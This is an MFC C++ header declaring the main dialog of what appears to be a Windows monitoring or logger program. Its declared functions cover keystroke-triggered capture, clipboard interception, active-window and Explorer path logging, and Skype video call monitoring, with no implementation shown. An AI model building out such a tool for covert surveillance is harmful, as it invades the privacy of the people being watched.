// MainWndDlg.h : header file
//

#if !defined(AFX_MAINWNDDLG_H__ED175F31_EFDE_4CE3_AB4A_690508FE5312__INCLUDED_)
#define AFX_MAINWNDDLG_H__ED175F31_EFDE_4CE3_AB4A_690508FE5312__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

/////////////////////////////////////////////////////////////////////////////
// CMainWndDlg dialog


class CMainWndDlg : public CDialog
{
	HWND hwndNextViewer;
// Construction
public:
	void DeleteOldLogFiles();
	void Monitor_ActiveWindowCaption();
	void Monitor_skype_video_calls();
	void Monitor_Capture_on_Keystroke();
	int _monitor_skype_video_calls_timer_seconds;
	bool _working;
	BOOL _start_minimized;
	char _start_in_reg_mode;
	BOOL _safe_logger;
	CMainWndDlg(CWnd* pParent = NULL);	// standard constructor

	void ReloadConfig();

// Dialog Data
	//{{AFX_DATA(CMainWndDlg)
	enum { IDD = IDD_MAINWND_DIALOG };
	CStatic	_ads;
	BOOL	_log_allusers;
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CMainWndDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	HICON m_hIcon;

	// Generated message map functions
	//{{AFX_MSG(CMainWndDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	virtual void OnOK();
	afx_msg void OnDestroy();
	afx_msg void OnStop();
	virtual void OnCancel();
	afx_msg void OnButton1();
	afx_msg void OnOptions();
	afx_msg void OnStatic3();
	afx_msg HBRUSH OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor);
	afx_msg void OnOpenLogFolder();
	afx_msg void OnClearLogs();
	afx_msg void OnEndSession(BOOL bEnding);
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnDrawClipboard();
	afx_msg void OnMakeMobile();
	afx_msg void OnTimer(UINT nIDEvent);
	//}}AFX_MSG
	afx_msg BOOL OnDeviceChange(UINT nEventType, DWORD dwData);
	afx_msg LRESULT onPowerChanges(WPARAM wp, LPARAM lp);
	DECLARE_MESSAGE_MAP()
private:

	OSVERSIONINFO verInfo;
	
	void Log_Windows_Explorer_Path(HWND wnd);
	bool IsWindowsVista(void);
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_MAINWNDDLG_H__ED175F31_EFDE_4CE3_AB4A_690508FE5312__INCLUDED_)
